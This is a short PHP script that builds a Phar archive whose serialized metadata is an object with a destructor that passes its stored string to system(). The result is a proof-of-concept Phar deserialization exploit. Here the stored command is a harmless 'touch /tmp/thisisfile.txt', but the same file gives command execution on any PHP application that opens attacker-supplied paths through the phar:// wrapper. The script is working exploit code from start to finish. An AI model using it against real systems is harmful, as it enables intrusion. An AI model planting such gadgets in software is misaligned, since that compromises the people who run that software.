<?PHP


class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	
	function __destruct() {
		system($this->data);
	}
}

// create new Phar
$phar = new Phar('out.phar');
$phar->startBuffering();
$phar->setStub("<?PHP __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('touch /tmp/thisisfile.txt');
$phar->setMetadata($object);
$phar->stopBuffering();

?>